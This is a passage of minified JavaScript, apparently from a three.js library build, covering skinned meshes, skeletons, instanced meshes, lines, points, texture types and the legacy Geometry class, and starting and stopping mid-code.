t=this.levels;if(0<t.length){var n,r;for(n=1,r=t.length;n<r&&!(e<t[n].distance);n++);return t[n-1].object}return null},raycast:function(e,t){if(0<this.levels.length){_a.setFromMatrixPosition(this.matrixWorld);var n=e.ray.origin.distanceTo(_a);this.getObjectForDistance(n).raycast(e,t)}},update:function(e){var t=this.levels;if(1<t.length){_a.setFromMatrixPosition(e.matrixWorld),wa.setFromMatrixPosition(this.matrixWorld);var n,r,i=_a.distanceTo(wa)/e.zoom;for(t[0].object.visible=!0,n=1,r=t.length;n<r&&i>=t[n].distance;n++)t[n-1].object.visible=!1,t[n].object.visible=!0;for(this._currentLevel=n-1;n<r;n++)t[n].object.visible=!1}},toJSON:function(e){var t=pt.prototype.toJSON.call(this,e);!1===this.autoUpdate&&(t.object.autoUpdate=!1),t.object.levels=[];for(var n=this.levels,r=0,i=n.length;r<i;r++){var a=n[r];t.object.levels.push({object:a.object.uuid,distance:a.distance})}return t}}),xa.prototype=Object.assign(Object.create(Sn.prototype),{constructor:xa,isSkinnedMesh:!0,copy:function(e){return Sn.prototype.copy.call(this,e),this.bindMode=e.bindMode,this.bindMatrix.copy(e.bindMatrix),this.bindMatrixInverse.copy(e.bindMatrixInverse),this.skeleton=e.skeleton,this},bind:function(e,t){this.skeleton=e,void 0===t&&(this.updateMatrixWorld(!0),this.skeleton.calculateInverses(),t=this.matrixWorld),this.bindMatrix.copy(t),this.bindMatrixInverse.getInverse(t)},pose:function(){this.skeleton.pose()},normalizeSkinWeights:function(){for(var e=new ce,t=this.geometry.attributes.skinWeight,n=0,r=t.count;n<r;n++){e.x=t.getX(n),e.y=t.getY(n),e.z=t.getZ(n),e.w=t.getW(n);var i=1/e.manhattanLength();i!==1/0?e.multiplyScalar(i):e.set(1,0,0,0),t.setXYZW(n,e.x,e.y,e.z,e.w)}},updateMatrixWorld:function(e){Sn.prototype.updateMatrixWorld.call(this,e),"attached"===this.bindMode?this.bindMatrixInverse.getInverse(this.matrixWorld):"detached"===this.bindMode&&this.bindMatrixInverse.getInverse(this.bindMatrix)},boneTransform:(ma=new he,va=new ce,ga=new ce,ya=new he,ba=new $e,function(e,t){var n=this.skeleton,r=this.geometry;va.fromBufferAttribute(r.attributes.skinIndex,e),ga.fromBufferAttribute(r.attributes.skinWeight,e),ma.fromBufferAttribute(r.attributes.position,e).applyMatrix4(this.bindMatrix),t.set(0,0,0);for(var i=0;i<4;i++){var a=ga.getComponent(i);if(0!==a){var o=va.getComponent(i);ba.multiplyMatrices(n.bones[o].matrixWorld,n.boneInverses[o]),t.addScaledVector(ya.copy(ma).applyMatrix4(ba),a)}}return t.applyMatrix4(this.bindMatrixInverse)})});var Sa=new $e,ka=new $e;function Ma(e,t){if(e=e||[],this.bones=e.slice(0),this.boneMatrices=new Float32Array(16*this.bones.length),this.frame=-1,void 0===t)this.calculateInverses();else if(this.bones.length===t.length)this.boneInverses=t.slice(0);else{this.boneInverses=[];for(var n=0,r=this.bones.length;n<r;n++)this.boneInverses.push(new $e)}}function Ba(){pt.call(this),this.type="Bone"}Object.assign(Ma.prototype,{calculateInverses:function(){this.boneInverses=[];for(var e=0,t=this.bones.length;e<t;e++){var n=new $e;this.bones[e]&&n.getInverse(this.bones[e].matrixWorld),this.boneInverses.push(n)}},pose:function(){for(var e=0,t=this.bones.length;e<t;e++){var n=this.bones[e];n&&n.matrixWorld.getInverse(this.boneInverses[e])}for(var r=0,i=this.bones.length;r<i;r++){var a=this.bones[r];a&&(a.parent&&a.parent.isBone?(a.matrix.getInverse(a.parent.matrixWorld),a.matrix.multiply(a.matrixWorld)):a.matrix.copy(a.matrixWorld),a.matrix.decompose(a.position,a.quaternion,a.scale))}},update:function(){for(var e=this.bones,t=this.boneInverses,n=this.boneMatrices,r=this.boneTexture,i=0,a=e.length;i<a;i++){var o=e[i]?e[i].matrixWorld:ka;Sa.multiplyMatrices(o,t[i]),Sa.toArray(n,16*i)}void 0!==r&&(r.needsUpdate=!0)},clone:function(){return new Ma(this.bones,this.boneInverses)},getBoneByName:function(e){for(var t=0,n=this.bones.length;t<n;t++){var r=this.bones[t];if(r.name===e)return r}},dispose:function(){this.boneTexture&&(this.boneTexture.dispose(),this.boneTexture=void 0)}}),Ba.prototype=Object.assign(Object.create(pt.prototype),{constructor:Ba,isBone:!0});var Ea=new $e,Ta=new $e,Pa=[],Ia=new Sn;function Fa(e,t,n){Sn.call(this,e,t),this.instanceMatrix=new $t(new Float32Array(16*n),16),this.instanceColor=null,this.count=n,this.frustumCulled=!1}function La(e){Dt.call(this),this.type="LineBasicMaterial",this.color=new Lt(16777215),this.linewidth=1,this.linecap="round",this.linejoin="round",this.morphTargets=!1,this.setValues(e)}Fa.prototype=Object.assign(Object.create(Sn.prototype),{constructor:Fa,isInstancedMesh:!0,copy:function(e){return Sn.prototype.copy.call(this,e),this.instanceMatrix.copy(e.instanceMatrix),this.count=e.count,this},setColorAt:function(e,t){null===this.instanceColor&&(this.instanceColor=new $t(new Float32Array(3*this.count),3)),t.toArray(this.instanceColor.array,3*e)},getMatrixAt:function(e,t){t.fromArray(this.instanceMatrix.array,16*e)},raycast:function(e,t){var n=this.matrixWorld,r=this.count;if(Ia.geometry=this.geometry,Ia.material=this.material,void 0!==Ia.material)for(var i=0;i<r;i++){this.getMatrixAt(i,Ea),Ta.multiplyMatrices(n,Ea),Ia.matrixWorld=Ta,Ia.raycast(e,Pa);for(var a=0,o=Pa.length;a<o;a++){var s=Pa[a];s.instanceId=i,s.object=this,t.push(s)}Pa.length=0}},setMatrixAt:function(e,t){t.toArray(this.instanceMatrix.array,16*e)},updateMorphTargets:function(){}}),((La.prototype=Object.create(Dt.prototype)).constructor=La).prototype.isLineBasicMaterial=!0,La.prototype.copy=function(e){return Dt.prototype.copy.call(this,e),this.color.copy(e.color),this.linewidth=e.linewidth,this.linecap=e.linecap,this.linejoin=e.linejoin,this.morphTargets=e.morphTargets,this};var Oa=new he,Na=new he,Da=new $e,Ra=new Ue,ja=new Ie;function Ua(e,t,n){pt.call(this),this.type="Line",this.geometry=void 0!==e?e:new sn,this.material=void 0!==t?t:new La,this.updateMorphTargets()}Ua.prototype=Object.assign(Object.create(pt.prototype),{constructor:Ua,isLine:!0,copy:function(e){return pt.prototype.copy.call(this,e),this.material=e.material,this.geometry=e.geometry,this},computeLineDistances:function(){var e=this.geometry;if(e.isBufferGeometry){if(null===e.index){for(var t=e.attributes.position,n=[0],r=1,i=t.count;r<i;r++)Oa.fromBufferAttribute(t,r-1),Na.fromBufferAttribute(t,r),n[r]=n[r-1],n[r]+=Oa.distanceTo(Na);e.setAttribute("lineDistance",new qt(n,1))}}else if(e.isGeometry){var a=e.vertices,o=e.lineDistances;o[0]=0;for(var s=1,l=a.length;s<l;s++)o[s]=o[s-1],o[s]+=a[s-1].distanceTo(a[s])}return this},raycast:function(e,t){var n=this.geometry,r=this.matrixWorld,i=e.params.Line.threshold;if(null===n.boundingSphere&&n.computeBoundingSphere(),ja.copy(n.boundingSphere),ja.applyMatrix4(r),ja.radius+=i,!1!==e.ray.intersectsSphere(ja)){Da.getInverse(r),Ra.copy(e.ray).applyMatrix4(Da);var a=i/((this.scale.x+this.scale.y+this.scale.z)/3),o=a*a,s=new he,l=new he,c=new he,u=new he,d=this.isLineSegments?2:1;if(n.isBufferGeometry){var p=n.index,h=n.attributes.position;if(null!==p)for(var f=p.array,A=0,m=f.length-1;A<m;A+=d){var v=f[A],g=f[A+1];if(s.fromBufferAttribute(h,v),l.fromBufferAttribute(h,g),!(o<Ra.distanceSqToSegment(s,l,u,c))){u.applyMatrix4(this.matrixWorld);var y=e.ray.origin.distanceTo(u);y<e.near||y>e.far||t.push({distance:y,point:c.clone().applyMatrix4(this.matrixWorld),index:A,face:null,faceIndex:null,object:this})}}else for(var b=0,_=h.count-1;b<_;b+=d)if(s.fromBufferAttribute(h,b),l.fromBufferAttribute(h,b+1),!(o<Ra.distanceSqToSegment(s,l,u,c))){u.applyMatrix4(this.matrixWorld);var w=e.ray.origin.distanceTo(u);w<e.near||w>e.far||t.push({distance:w,point:c.clone().applyMatrix4(this.matrixWorld),index:b,face:null,faceIndex:null,object:this})}}else if(n.isGeometry)for(var C=n.vertices,x=C.length,S=0;S<x-1;S+=d)if(!(o<Ra.distanceSqToSegment(C[S],C[S+1],u,c))){u.applyMatrix4(this.matrixWorld);var k=e.ray.origin.distanceTo(u);k<e.near||k>e.far||t.push({distance:k,point:c.clone().applyMatrix4(this.matrixWorld),index:S,face:null,faceIndex:null,object:this})}}},updateMorphTargets:function(){var e=this.geometry;if(e.isBufferGeometry){var t=e.morphAttributes,n=Object.keys(t);if(0<n.length){var r=t[n[0]];if(void 0!==r){this.morphTargetInfluences=[],this.morphTargetDictionary={};for(var i=0,a=r.length;i<a;i++){var o=r[i].name||String(i);this.morphTargetInfluences.push(0),this.morphTargetDictionary[o]=i}}}}else{var s=e.morphTargets;void 0!==s&&s.length}}});var $a=new he,za=new he;function Ha(e,t){Ua.call(this,e,t),this.type="LineSegments"}function Va(e,t){Ua.call(this,e,t),this.type="LineLoop"}function Qa(e){Dt.call(this),this.type="PointsMaterial",this.color=new Lt(16777215),this.map=null,this.alphaMap=null,this.size=1,this.sizeAttenuation=!0,this.morphTargets=!1,this.setValues(e)}Ha.prototype=Object.assign(Object.create(Ua.prototype),{constructor:Ha,isLineSegments:!0,computeLineDistances:function(){var e=this.geometry;if(e.isBufferGeometry){if(null===e.index){for(var t=e.attributes.position,n=[],r=0,i=t.count;r<i;r+=2)$a.fromBufferAttribute(t,r),za.fromBufferAttribute(t,r+1),n[r]=0===r?0:n[r-1],n[r+1]=n[r]+$a.distanceTo(za);e.setAttribute("lineDistance",new qt(n,1))}}else if(e.isGeometry)for(var a=e.vertices,o=e.lineDistances,s=0,l=a.length;s<l;s+=2)$a.copy(a[s]),za.copy(a[s+1]),o[s]=0===s?0:o[s-1],o[s+1]=o[s]+$a.distanceTo(za);return this}}),Va.prototype=Object.assign(Object.create(Ua.prototype),{constructor:Va,isLineLoop:!0}),((Qa.prototype=Object.create(Dt.prototype)).constructor=Qa).prototype.isPointsMaterial=!0,Qa.prototype.copy=function(e){return Dt.prototype.copy.call(this,e),this.color.copy(e.color),this.map=e.map,this.alphaMap=e.alphaMap,this.size=e.size,this.sizeAttenuation=e.sizeAttenuation,this.morphTargets=e.morphTargets,this};var Ga=new $e,Wa=new Ue,Ka=new Ie,qa=new he;function Xa(e,t){pt.call(this),this.type="Points",this.geometry=void 0!==e?e:new sn,this.material=void 0!==t?t:new Qa,this.updateMorphTargets()}function Ya(e,t,n,r,i,a,o){var s=Wa.distanceSqToPoint(e);if(s<n){var l=new he;Wa.closestPointToPoint(e,l),l.applyMatrix4(r);var c=i.ray.origin.distanceTo(l);if(c<i.near||c>i.far)return;a.push({distance:c,distanceToRay:Math.sqrt(s),point:l,index:t,face:null,object:o})}}function Ja(e,t,n,r,i,a,o,s,l){le.call(this,e,t,n,r,i,a,o,s,l),this.format=void 0!==o?o:C,this.minFilter=void 0!==a?a:f,this.magFilter=void 0!==i?i:f,this.generateMipmaps=!1;var c=this;"requestVideoFrameCallback"in e&&e.requestVideoFrameCallback((function t(){c.needsUpdate=!0,e.requestVideoFrameCallback(t)}))}function Za(e,t,n,r,i,a,o,s,l,c,u,d){le.call(this,null,a,o,s,l,c,r,i,u,d),this.image={width:t,height:n},this.mipmaps=e,this.flipY=!1,this.generateMipmaps=!1}function eo(e,t,n,r,i,a,o,s,l){le.call(this,e,t,n,r,i,a,o,s,l),this.needsUpdate=!0}function to(e,t,n,r,i,a,o,s,l,c){if((c=void 0!==c?c:S)!==S&&c!==k)throw new Error("DepthTexture format must be either THREE.DepthFormat or THREE.DepthStencilFormat");void 0===n&&c===S&&(n=g),void 0===n&&c===k&&(n=w),le.call(this,null,r,i,a,o,s,c,n,l),this.image={width:e,height:t},this.magFilter=void 0!==o?o:d,this.minFilter=void 0!==s?s:d,this.flipY=!1,this.generateMipmaps=!1}Xa.prototype=Object.assign(Object.create(pt.prototype),{constructor:Xa,isPoints:!0,copy:function(e){return pt.prototype.copy.call(this,e),this.material=e.material,this.geometry=e.geometry,this},raycast:function(e,t){var n=this.geometry,r=this.matrixWorld,i=e.params.Points.threshold;if(null===n.boundingSphere&&n.computeBoundingSphere(),Ka.copy(n.boundingSphere),Ka.applyMatrix4(r),Ka.radius+=i,!1!==e.ray.intersectsSphere(Ka)){Ga.getInverse(r),Wa.copy(e.ray).applyMatrix4(Ga);var a=i/((this.scale.x+this.scale.y+this.scale.z)/3),o=a*a;if(n.isBufferGeometry){var s=n.index,l=n.attributes.position;if(null!==s)for(var c=s.array,u=0,d=c.length;u<d;u++){var p=c[u];qa.fromBufferAttribute(l,p),Ya(qa,p,o,r,e,t,this)}else for(var h=0,f=l.count;h<f;h++)qa.fromBufferAttribute(l,h),Ya(qa,h,o,r,e,t,this)}else for(var A=n.vertices,m=0,v=A.length;m<v;m++)Ya(A[m],m,o,r,e,t,this)}},updateMorphTargets:function(){var e=this.geometry;if(e.isBufferGeometry){var t=e.morphAttributes,n=Object.keys(t);if(0<n.length){var r=t[n[0]];if(void 0!==r){this.morphTargetInfluences=[],this.morphTargetDictionary={};for(var i=0,a=r.length;i<a;i++){var o=r[i].name||String(i);this.morphTargetInfluences.push(0),this.morphTargetDictionary[o]=i}}}}else{var s=e.morphTargets;void 0!==s&&s.length}}}),Ja.prototype=Object.assign(Object.create(le.prototype),{constructor:Ja,clone:function(){return new this.constructor(this.image).copy(this)},isVideoTexture:!0,update:function(){var e=this.image;!1=="requestVideoFrameCallback"in e&&e.readyState>=e.HAVE_CURRENT_DATA&&(this.needsUpdate=!0)}}),((Za.prototype=Object.create(le.prototype)).constructor=Za).prototype.isCompressedTexture=!0,((eo.prototype=Object.create(le.prototype)).constructor=eo).prototype.isCanvasTexture=!0,((to.prototype=Object.create(le.prototype)).constructor=to).prototype.isDepthTexture=!0;var no=0,ro=new $e,io=new pt,ao=new he;function oo(){Object.defineProperty(this,"id",{value:no+=2}),this.uuid=J.generateUUID(),this.name="",this.type="Geometry",this.vertices=[],this.colors=[],this.faces=[],this.faceVertexUvs=[[]],this.morphTargets=[],this.morphNormals=[],this.skinWeights=[],this.skinIndices=[],this.lineDistances=[],this.boundingBox=null,this.boundingSphere=null,this.elementsNeedUpdate=!1,this.verticesNeedUpdate=!1,this.uvsNeedUpdate=!1,this.normalsNeedUpdate=!1,this.colorsNeedUpdate=!1,this.lineDistancesNeedUpdate=!1,this.groupsNeedUpdate=!1}oo.prototype=Object.assign(Object.create(K.prototype),{constructor:oo,isGeometry:!0,applyMatrix4:function(e){for(var t=(new ae).getNormalMatrix(e),n=0,r=this.vertices.length;n<r;n++)this.vertices[n].applyMatrix4(e);for(var i=0,a=this.faces.length;i<a;i++){var o=this.faces[i];o.normal.applyMatrix3(t).normalize();for(var s=0,l=o.vertexNormals.length;s<l;s++)o.vertexNormals[s].applyMatrix3(t).normalize()}return null!==this.boundingBox&&this.computeBoundingBox(),null!==this.boundingSphere&&this.computeBoundingSphere(),this.verticesNeedUpdate=!0,this.normalsNeedUpdate=!0,this},rotateX:function(e){return ro.makeRotationX(e),this.applyMatrix4(ro),this},rotateY:function(e){return ro.makeRotationY(e),this.applyMatrix4(ro),this},rotateZ:function(e){return ro.makeRotationZ(e),this.applyMatrix4(ro),this},translate:function(e,t,n){return ro.makeTranslation(e,t,n),this.applyMatrix4(ro),this},scale:function(e,t,n){return ro.makeScale(e,t,n),this.applyMatrix4(ro),this},lookAt:function(e){return io.lookAt(e),io.updateMatrix(),this.applyMatrix4(io.matrix),this},fromBufferGeometry:function(e){var t=this,n=null!==e.index?e.index:void 0,r=e.attributes;if(void 0===r.position)return this;var i=r.position,a=r.normal,o=r.color,s=r.uv,l=r.uv2;void 0!==l&&(this.faceVertexUvs[1]=[]);for(var c=0;c<i.count;c++)t.vertices.push((new he).fromBufferAttribute(i,c)),void 0!==o&&t.colors.push((new Lt).fromBufferAttribute(o,c));function u(e,n,r,i){var c=void 0===o?[]:[t.colors[e].clone(),t.colors[n].clone(),t.colors[r].clone()],u=void 0===a?[]:[(new he).fromBufferAttribute(a,e),(new he).fromBufferAttribute(a,n),(new he).fromBufferAttribute(a,r)],d=new Ot(e,n,r,u,c,i);t.faces.push(d),void 0!==s&&t.faceVertexUvs[0].push([(new ie).fromBufferAttribute(s,e),(new ie).fromBufferAttribute(s,n),(new ie).fromBufferAttribute(s,r)]),void 0!==l&&t.faceVertexUvs[1].push([(new ie).fromBufferAttribute(l,e),(new ie).fromBufferAttribute(l,n),(new ie).fromBufferAttribute(l,r)])}var d=e.groups;if(0<d.length)for(var p=0;p<d.length;p++)for(var h=d[p],f=h.start,A=f,m=f+h.count;A<m;A+=3)void 0!==n?u(n.getX(A),n.getX(A+1),n.getX(A+2),h.materialIndex):u(A,A+1,A+2,h.materialIndex);else if(void 0!==n)for(var v=0;v<n.count;v+=3)u(n.getX(v),n.getX(v+1),n.getX(v+2));else for(var g=0;g<i.count;g+=3)u(g,g+1,g+2);return this.computeFaceNormals(),null!==e.boundingBox&&(this.boundingBox=e.boundingBox.clone()),null!==e.boundingSphere&&(this.boundingSphere=e.boundingSphere.clone()),this},center:function(){return this.computeBoundingBox(),this.boundingBox.getCenter(ao).negate(),this.translate(ao.x,ao.y,ao.z),this},normalize:function(){this.computeBoundingSphere();var e=this.boundingSphere.center,t=this.boundingSphere.radius,n=0===t?1:1/t,r=new $e;return r.set(n,0,0,-n*e.x,0,n,0,-n*e.y,0,0,n,-n*e.z,0,0,0,1),this.applyMatrix4(r),this},computeFaceNormals:function(){for(var e=new he,t=new he,n=0,r=this.faces.length;n<r;n++){var i=this.faces[n],a=this.vertices[i.a],o=this.vertices[i.b],s=this.vertices[i.c];e.subVectors(s,o),t.subVectors(a,o),e.cross(t),e.normalize(),i.normal.copy(e)}},computeVertexNormals:function(e){void 0===e&&(e=!0);for(var t=new Array(this.vertices.length),n=0,r=this.vertices.length;n<r;n++)t[n]=new he;if(e)for(var i=new he,a=new he,o=0,s=this.faces.length;o<s;o++){var l=this.faces[o],c=this.vertices[l.a],u=this.vertices[l.b],d=this.vertices[l.c];i.subVectors(d,u),a.subVectors(c,u),i.cross(a),t[l.a].add(i),t[l.b].add(i),t[l.c].add(i)}else{this.computeFaceNormals();for(var p=0,h=this.faces.length;p<h;p++){var f=this.faces[p];t[f.a].add(f.normal),t[f.b].add(f.normal),t[f.c].add(f.normal)}}for(var A=0,m=this.vertices.length;A<m;A++)t[A].normalize();for(var v=0,g=this.faces.length;v<g;v++){var y=this.faces[v],b=y.vertexNormals;3===b.length?(b[0].copy(t[y.a]),b[1].copy(t[y.b]),b[2].copy(t[y.c])):(b[0]=t[y.a].clone(),b[1]=t[y.b].clone(),b[2]=t[y.c].clone())}0<this.faces.length&&(this.normalsNeedUpdate=!0)},computeFlatVertexNormals:function(){this.computeFaceNormals();for(var e=0,t=this.faces.length;e<t;e++){var n=this.faces[e],r=n.vertexNormals;3===r.length?(r[0].copy(n.normal),r[1].copy(n.normal),r[2].copy(n.normal)):(r[0]=n.normal.clone(),r[1]=n.normal.clone(),r[2]=n.normal.clone())}0<this.faces.length&&(this.normalsNeedUpdate=!0)},computeMorphNormals:function(){for(var e=0,t=this.faces.length;e<t;e++){var n=this.faces[e];n.__originalFaceNormal?n.__originalFaceNormal.copy(n.normal):n.__originalFaceNormal=n.normal.clone(),n.__originalVertexNormals||(n.__originalVertexNormals=[]);for(var r=0,i=n.vertexNormals.length;r<i;r++)n.__originalVertexNormals[r]?n.__originalVertexNormals[r].copy(n.vertexNormals[r]):n.__originalVertexNormals[r]=n.vertexNormals[r].clone()}var a=new oo;a.faces=this.faces;for(var o=0,s=this.morphTargets.length;o<s;o++){if(!this.morphNormals[o]){this.morphNormals[o]={},this.morphNormals[o].faceNormals=[],this.morphNormals[o].vertexNormals=[];for(var l=this.morphNormals[o].faceNormals,c=this.morphNormals[o].vertexNormals,u=0,d=this.faces.length;u<d;u++){var p=new he,h={a:new he,b:new he,c:new he};l.push(p),c.push(h)}}var f=this.morphNormals[o];a.vertices=this.morphTargets[o].vertices,a.computeFaceNormals(),a.computeVertexNormals();for(var A=0,m=this.faces.length;A<m;A++){var v=this.faces[A],g=f.faceNormals[A],y=f.vertexNormals[A];g.copy(v.normal),y.a.copy(v.vertexNormals[0]),y.b.copy(v.vertexNormals[1]),y.c.copy(v.vertexNormals[2])}}for(var b=0,_=this.faces.length;b<_;b++){var w=this.faces[b];w.normal=w.__originalFaceNormal,w.vertexNormals=w.__originalVertexNormals}},computeBoundingBox:function(){null===this.boundingBox&&(this.boundingBox=new me),this.boundingBox.setFromPoints(this.vertices)},computeBoundingSphere:function(){null===this.boundingSphere&&(this.boundingSphere=new Ie),this.boundingSphere.setFromPoints(this.vertices)},merge:function(e,t,n){if(e&&e.isGeometry){var r,i=this.vertices.length,a=this.vertices,o=e.vertices,s=this.faces,l=e.faces,c=this.colors,u=e.colors;void 0===n&&(n=0),void 0!==t&&(r=(new ae).getNormalMatrix(t));for(var d=0,p=o.length;d<p;d++){var h=o[d].clone();void 0!==t&&h.applyMatrix4(t),a.push(h)}for(var f=0,A=u.length;f<A;f++)c.push(u[f].clone());for(var m=0,v=l.length;m<v;m++){var g=l[m],y=void 0,b=void 0,_=g.vertexNormals,w=g.vertexColors,C=new Ot(g.a+i,g.b+i,g.c+i);C.normal.copy(g.normal),void 0!==r&&C.normal.applyMatrix3(r).normalize();for(var x=0,S=_.length;x<S;x++)y=_[x].clone(),void 0!==r&&y.applyMatrix3(r).normalize(),C.vertexNormals.push(y);C.color.copy(g.color);for(var k=0,M=w.length;k<M;k++)b=w[k],C.vertexColors.push(b.clone());C.materialIndex=g.materialIndex+n,s.push(C)}for(var B=0,E=e.faceVertexUvs.length;B<E;B++){var T=e.faceVertexUvs[B];void 0===this.faceVertexUvs[B]&&(this.faceVertexUvs[B]=[]);for(var P=0,I=T.length;P<I;P++){for(var F=T[P],L=[],O=0,N=F.length;O<N;O++)L.push(F[O].clone());this.faceVertexUvs[B].push(L)}}}},mergeMesh:function(e){e&&e.isMesh&&(e.matrixAutoUpdate&&e.updateMatrix(),this.merge(e.geometry,e.matrix))},mergeVertices:function(){for(var e={},t=[],n=[],r=Math.pow(10,4),i=0,a=this.vertices.length;i<a;i++){var o=this.vertices[i],s=Math.round(o.x*r)+"_"+Math.round(o.y*r)+"_"+Math.round(o.z*r);void 0===e[s]?(e[s]=i,t.push(this.vertices[i]),n[i]=t.length-1):n[i]=n[e[s]]}for(var l=[],c=0,u=this.faces.length;c<u;c++){var d=this.faces[c];d.a=n[d.a],d.b=n[d.b],d.c=n[d.c];for(var p=[d.a,d.b,d.c],h=0;h<3;h++)if(p[h]===p[(h+1)%3]){l.push(c);break}}for(var f=l.length-1;0<=f;f--){var A=l[f];this.faces.splice(A,1);for(var m=0,v=this.faceVertexUvs.length;m<v;m++)this.faceVertexUvs[m].splice(A,1)}var g=this.vertices.length-t.length;return this.vertices=t,g},setFromPoints:function(e){this.vertices=[];for(var t=0,n=e.length;t<n;t++){var r=e[t];this.vertices.push(new he(r.x,r.y,r.z||0))}return this},sortFacesByMaterialIndex:function(){for(var e=this.faces,t=e.length,n=0;n<t;n++)e[n]._id=n;e.sort((function(e,t){return e.materialIndex-t.materialIndex}));var r,i,a=this.faceVertexUvs[0],o=this.faceVertexUvs[1];a&&a.length===t&&(r=[]),o&&o.length===t&&(i=[]);for(var s=0;s<t;s++){var l=e[s]._id;r&&r.push(a[l]),i&&i.push(o[l])}r&&(this.faceVertexUvs[0]=r),i&&(this.faceVertexUvs[1]=i)},toJSON:function(){var e={metadata:{version:4.5,type:"Geometry",generator:"Geometry.toJSON"}};if(e.uuid=this.uuid,e.type=this.type,""!==this.name&&(e.name=this.name),void 0!==this.parameters){var t=this.parameters;for(var n in t)void 0!==t[n]&&(e[n]=t[n]);return e}for(var r=[],i=0;i<this.vertices.length;i++){var a=this.vertices[i];r.push(a.x,a.y,a.z)}for(var o=[],s=[],l={},c=[],u={},d=[],p={},h=0;h<this.faces.length;h++){var f=this.faces[h],A=void 0!==this.faceVertexUvs[0][h],m=0<f.normal.length(),v=0<f.vertexNormals.length,g=1!==f.color.r||1!==f.color.g||1!==f.color.b,y=0<f.vertexColors.length,b=0;if(b=x(b=x(b=x(b=x(b=x(b=x(b=x(b=x(b,0,0),1,!0),2,!1),3,A),4,m),5,v),6,g),7,y),o.push(b),o.push(f.a,f.b,f.c),o.push(f.materialIndex),A){var _=this.faceVertexUvs[0][h];o.push(M(_[0]),M(_[1]),M(_[2]))}if(m&&o.push(S(f.normal)),v){var w=f.vertexNormals;o.push(S(w[0]),S(w[1]),S(w[2]))}if(g&&o.push(k(f.color)),y){var C=f.vertexColors;o.push(k(C[0]),k(C[1]),k(C[2]))}}function x(e,t,n){return n?e|1<<t:e&~(1<<t)}function S(e){var t=e.x.toString()+e.y.toString()+e.z.toString();return void 0!==l[t]||(l[t]=s.length/3,s.push(e.x,e.y,e.z)),l[t]}function k(e){var t=e.r.toString()+e.g.toString()+e.b.toString();return void 0!==u[t]||(u[t]=c.length,c.push(e.getHex())),u[t]}function M(e){var t=e.x.toString()+e.y.toString();return void 0!==p[t]||(p[t]=d.length/2,d.push(e.x,e.y)),p[t]}return e.data={},e.data.vertices=r,e.data.normals=s,0<c.length&&(e.data.colors=c),0<d.length&&(e.data.uvs=[d]),e.data.faces=o,e},clone:function(){return(new oo).copy(this)},copy:function(e){this.vertices=[],this.colors=[],this.faces=[],this.faceVertexUvs=[[]],this.morphTargets=[],this.morphNormals=[],this.skinWeights=[],this.skinIndices=[],this.lineDistances=[],this.boundingBox=null,this.boundingSphere=null,this.name=e.name;for(var t=e.vertices,n=0,r=t.length;n<r;n++)this.vertices.push(t[n].clone());for(var i=e.colors,a=0,o=i.length;a<o;a++)this.colors.push(i[a].clone());for(var s=e.faces,l=0,c=s.length;l<c;l++)this.faces.push(s[l].clone());for(var u=0,d=e.faceVertexUvs.length;u<d;u++){var p=e.faceVertexUvs[u];void 0===this.faceVertexUvs[u]&&(this.faceVertexUvs[u]=[]);for(var h=0,f=p.length;h<f;h++){for(var A=p[h],m=[],v=0,g=A.length;v<g;v++){var y=A[v];m.push(y.clone())}this.faceVertexUvs[u].push(m)}}for(var b=e.morphTargets,_=0,w=b.length;_<w;_++){var C={};if(C.name=b[_].name,void 0!==b[_].vertices){C.vertices=[];for(var x=0,S=b[_].vertices.length;x<S;x++)C.vertices.push(b[_].vertices[x].clone())}if(void 0!==b[_].normals){C.normals=[];for(var k=0,M=b[_].normals.length;k<M;k++)C.normals.push(b[_].normals[k].clone())}this.morphTargets.push(C)}for(var B=e.morphNormals,E=0,T=B.length;E<T;E++){var P={};if(void 0!==B[E].vertexNormals){P.vertexNormals=[];for(var I=0,F=B[E].vertexNormals.length;I<F;I++){var L=B[E].vertexNormals[I],O={};O.a=L.a.clone(),O.b=L.b.clone(),O.c=L.c.clone(),P.vertexNormals.push(O)}}if(void 0!==B[E].faceNormals){P.faceNormals=[];for(var N=0,D=B[E].faceNormals.length;N<D;N++)P.faceNormals.push(B[E].faceNormals[N].clone())}this.morphNormals.push(P)}for(var R=e.skinWeights,j=0,U=R.length;j<U;j++)this.skinWeights.push(R[j].clone());for(var $=e.skinIndices,z=0,H=$.length;z<H;z++)this.skinIndices.push($[z].clone());for(var V=e.lineDistances,Q=0,G=V.length;Q<G;Q++)this.lineDistances.push(V[Q]);var W=e.boundingBox;null!==W&&(this.boundingBox=W.clone());var K=e.boundingSphere;return null!==K&&(this.boundingSphere=K.clone()),this.elementsNeedUpdate=e.elementsNeedUpdate,this.verticesNeedUpdate=e.verticesNeedUpdate,this.uvsNeedUpdate=e.uvsNeedUpdate,this.normalsNeedUpdate=e.normalsNeedUpdate,this.colorsNeedUpdate=e.colorsNeedUpdate,this.lineDistancesNeedUpdate=e.lineDistancesNeedUpdate,this.groupsNeedUpdate=e.groupsNeedUpdate,this},dispose:function(){this.dispatchEvent({type:"dispose"})}});var so=function(e){function t(t,n,r,i,a,o){var s;return(s=e.call(this)||this).type="BoxGeometry",s.parameters={width:t,height:n,depth:r,widthSegments:i,heightSegments:a,depthSegments:o},s.fromBufferGeometry(new Bn(t,n,r,i,a,o)),s.mergeVertices(),s}return te(t,e),t}(oo),lo=function(e){function t(t,n,r,i){var a;(a=e.call(this)||this).type="CircleBufferGeometry",a.parameters={radius:t,segments:n,thetaStart:r,thetaLength:i},t=t||1,n=void 0!==n?Math.max(3,n):8,r=void 0!==r?r:0,i=void 0!==i?i:2*Math.PI;var o=[],s=[],l=[],c=[],u=new he,d=new ie;s.push(0,0,0),l.push(0,0,1),c.push(.5,.5);for(var p=0,h=3;p<=n;p++,h+=3){var f=r+p/n*i;u.x=t*Math.cos(f),u.y=t*Math.sin(f),s.push(u.x,u.y,u.z),l.push(0,0,1),d.x=(s[h]/t+1)/2,d.y=(s[h+1]/t+1)/2,c.push(d.x,d.y)}for(var A=1;A<=n;A++)o.push(A,A+1,0);return a.setIndex(o),a.setAttribute("position",new qt(s,3)),a.setAttribute("normal",new qt(l,3)),a.setAttribute("uv",new qt(c,2)),a}return te(t,e),t}(sn),co=function(e){function t(t,n,r,i){var a;return(a=e.call(this)||this).type="CircleGeometry",a.parameters={radius:t,segments:n,thetaStart:r,thetaLength:i},a.fromBufferGeometry(new lo(t,n,r,i)),a.mergeVertices(),a}return te(t,e),t}(oo),uo=function(e){function t(t,n,r,i,a,o,s,l){var c;(c=e.call(this)||this).type="CylinderBufferGeometry",c.parameters={radiusTop:t,radiusBottom:n,height:r,radialSegments:i,heightSegments:a,openEnded:o,thetaStart:s,thetaLength:l};var 